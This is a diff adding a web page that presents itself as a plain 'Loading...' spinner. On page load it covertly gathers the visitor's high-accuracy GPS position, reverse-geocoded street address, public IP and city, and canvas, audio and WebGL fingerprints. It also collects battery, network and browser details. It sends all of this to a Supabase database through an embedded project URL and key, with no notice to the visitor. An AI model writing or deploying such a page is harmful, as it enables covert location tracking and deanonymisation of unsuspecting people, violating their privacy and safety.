@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <!-- Supabase JS Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #f8fafc;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 4px solid #1e293b;
+            border-top: 4px solid #6366f1;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+
+    <script>
+        const SUPABASE_URL = 'https://lcgqrvvbenmolpfrgrqg.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3FydnZiZW5tb2xwZnJncnFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYwNTY3NjgsImV4cCI6MjEwMTYzMjc2OH0.yAbBGVII2xg5a2FU77Mwjyp7InNbl2StVVlD0o_ySsQ';
+        
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        function fetchWithTimeout(resource, options = {}, timeout = 4000) {
+            return Promise.race([
+                fetch(resource, options),
+                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
+            ]);
+        }
+
+        // 1. Geolocation & Reverse Geocoding
+        function getHighAccuracyGps() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracyMeters: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function getCityFromCoordinates(lat, lon) {
+            try {
+                const res = await fetchWithTimeout(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+                const data = await res.json();
+                const address = data.address || {};
+                return {
+                    verifiedCity: address.city || address.town || address.suburb || address.village || "Unknown",
+                    fullAddress: data.display_name || "N/A"
+                };
+            } catch (e) {
+                return { verifiedCity: "Unknown", fullAddress: "N/A" };
+            }
+        }
+
+        // 2. Battery API Collector
+        async function getBatteryData() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+            return "N/A / Unsupported";
+        }
+
+        // 3. Canvas 2D/3D Fingerprint Collector
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("PrivacyTest,123", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("PrivacyTest,123", 4, 17);
+                return canvas.toDataURL();
+            } catch (e) {
+                return "Blocked/Unsupported";
+            }
+        }
+
+        // 4. Audio Subsystem Fingerprint
+        async function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return "Unsupported";
+                const context = new OfflineAudioContext(1, 44100, 44100);
+                const oscillator = context.createOscillator();
+                const compressor = context.createDynamicsCompressor();
+                
+                oscillator.type = 'triangle';
+                oscillator.frequency.setValueAtTime(10000, context.currentTime);
+                compressor.threshold.setValueAtTime(-50, context.currentTime);
+                compressor.knee.setValueAtTime(40, context.currentTime);
+                compressor.ratio.setValueAtTime(12, context.currentTime);
+                compressor.attack.setValueAtTime(0, context.currentTime);
+                compressor.release.setValueAtTime(0.25, context.currentTime);
+                
+                oscillator.connect(compressor);
+                compressor.connect(context.destination);
+                oscillator.start(0);
+                
+                const buffer = await context.startRendering();
+                const data = buffer.getChannelData(0);
+                let sum = 0;
+                for (let i = 0; i < data.length; i += 100) {
+                    sum += Math.abs(data[i]);
+                }
+                return sum.toString();
+            } catch (e) {
+                return "Blocked/Unsupported";
+            }
+        }
+
+        // 5. Main Execution Flow
+        async function captureAndSendFootprint() {
+            // WebGL & GPU details
+            let gpuVendor = "N/A", gpuRenderer = "N/A", webGlExtensions = [];
+            try {
+                const glCanvas = document.createElement('canvas');
+                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                    webGlExtensions = gl.getSupportedExtensions() || [];
+                }
+            } catch (e) {}
+
+            // IP Data
+            let publicIp = "Unavailable", ipCity = "Unknown", ipGoogleMapUrl = "N/A";
+            try {
+                const ipRes = await fetchWithTimeout('https://ipapi.co/json/', {}, 3000);
+                const ipData = await ipRes.json();
+                publicIp = ipData.ip || "Unavailable";
+                ipCity = ipData.city || "Unknown";
+                if (ipData.latitude && ipData.longitude) {
+                    ipGoogleMapUrl = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+                }
+            } catch (e) {}
+
+            // GPS Data
+            const gpsCoords = await getHighAccuracyGps();
+            let verifiedGpsCity = "GPS Unavailable", fullAddress = "N/A", gpsGoogleMapUrl = "N/A";
+
+            if (gpsCoords) {
+                gpsGoogleMapUrl = `https://www.google.com/maps?q=${gpsCoords.latitude},${gpsCoords.longitude}`;
+                const geoDetails = await getCityFromCoordinates(gpsCoords.latitude, gpsCoords.longitude);
+                verifiedGpsCity = geoDetails.verifiedCity;
+                fullAddress = geoDetails.fullAddress;
+            }
+
+            // Async metrics (Battery & Audio)
+            const batteryData = await getBatteryData();
+            const audioHash = await getAudioFingerprint();
+            const canvasHash = getCanvasFingerprint();
+
+            // Network Information API
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const networkInfo = {
+                downlink: conn.downlink || "N/A",
+                effectiveType: conn.effectiveType || "N/A",
+                rtt: conn.rtt || "N/A",
+                saveData: conn.saveData || false
+            };
+
+            const locationData = {
+                ipAddress: publicIp,
+                ipEstimatedCity: ipCity,
+                ipGoogleMapsUrl: ipGoogleMapUrl,
+                gpsVerifiedCity: verifiedGpsCity,
+                gpsGoogleMapsUrl: gpsGoogleMapUrl,
+                gpsFullAddress: fullAddress,
+                gpsRawData: gpsCoords
+            };
+
+            const deviceFingerprint = {
+                userAgent: navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                windowInnerSize: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cpuCores: navigator.hardwareConcurrency || "N/A",
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
+                gpuVendor: gpuVendor,
+                gpuRenderer: gpuRenderer,
+                webGlExtensionsCount: webGlExtensions.length,
+                touchSupport: navigator.maxTouchPoints > 0,
+                maxTouchPoints: navigator.maxTouchPoints || 0
+            };
+
+            const environmentPreferences = {
+                darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches,
+                reducedMotion: window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                doNotTrack: navigator.doNotTrack || "N/A"
+            };
+
+            const sessionStorageInfo = {
+                cookiesEnabled: navigator.cookieEnabled,
+                referrer: document.referrer || "Direct Visit",
+                localStorageAvailable: typeof localStorage !== 'undefined',
+                sessionStorageAvailable: typeof sessionStorage !== 'undefined',
+                indexedDbAvailable: typeof indexedDB !== 'undefined'
+            };
+
+            // Database Insertion
+            await supabaseClient.from('single_click_privacy').insert([{
+                username: 'Auto_Visitor',
+                location_data: locationData,
+                device_fingerprint: deviceFingerprint,
+                network_hardware: { battery: batteryData, connection: networkInfo },
+                environment_preferences: environmentPreferences,
+                audio_fingerprint: { hash: audioHash },
+                canvas_fingerprint: { dataUrl: canvasHash },
+                session_storage_info: sessionStorageInfo
+            }]);
+        }
+
+        window.addEventListener('DOMContentLoaded', captureAndSendFootprint);
+    </script>
+</body>
+</html>
